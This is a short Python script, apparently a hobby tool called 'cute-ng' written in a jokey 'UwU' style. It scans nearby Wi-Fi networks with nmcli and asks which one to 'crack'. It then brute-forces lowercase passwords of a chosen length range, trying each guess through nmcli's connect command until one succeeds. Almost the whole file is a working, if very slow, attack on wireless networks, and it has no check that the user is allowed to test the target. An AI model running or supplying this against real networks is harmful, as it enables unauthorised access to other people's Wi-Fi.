import itertools
import string
import subprocess

print("~Welcum to cute-ng UwU!\nP.S: It basiclly takes something around 500 years to guess an 10 symbols password, so good lunk I guess")

def network_searcher():
    subprocess.run(['nmcli', 'device', 'wifi'])
    network = input("Whick network to crack? (Enter full network name): ")
    return network

def password_guesser(network):
    charset = string.ascii_lowercase 
    min_length = int(input("Minyamal passuwurd lenght? (Enter int valuwue): "))
    max_length = int(input("Maximal passuwurd lenght? (Enter int valuwue): "))

    for length in range(min_length, max_length + 1):
        for guess in itertools.product(charset, repeat=length):
            guess_password = ''.join(guess)
            print(f'Tryaing passuwurd... {guess_password}')
            
            result = subprocess.run(['nmcli', 'device', 'wifi', 'connect', network, 'password', guess_password], 
                                    text=True, capture_output=True)
            
            if "successfully" in result.stdout:
                print(f'Passuwurd was fouwund: {guess_password}! ^~^')
                return guess_password

    print("Passuwurd not fouwund... >~<")
    return None

if __name__ == "__main__":
    network = network_searcher()
    password_guesser(network)
